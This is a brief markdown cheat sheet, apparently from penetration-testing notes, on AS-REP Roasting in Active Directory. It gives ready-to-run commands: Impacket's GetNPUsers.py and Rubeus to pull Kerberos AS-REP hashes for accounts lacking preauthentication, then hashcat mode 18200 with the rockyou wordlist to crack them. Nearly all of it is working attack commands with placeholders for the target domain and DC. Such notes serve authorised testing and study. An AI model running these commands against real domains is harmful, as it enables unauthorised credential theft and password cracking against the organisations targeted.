# AS-REP Roasting

***Requirements :***   
- Valid usernames list
- AD Users with **DONT_REQUIRE_PREAUTH** set
## Retrieve TGT 
### Using Impacket
On the attacket shell
```bash
GetNPUsers.py <TARGET DOMAIN>/ -dc-ip <DC IP>  -usersfile <USERLIST> -no-pass
```

### Using Rubeus
Via the target machine shell

```cmd
Rubeus.exe asreproast 
```

## Crack TGTs \\w hashcat

```bash
hashcat -a 0 -m 18200 <HASH FILE> /usr/share/wordlists/rockyou.txt
```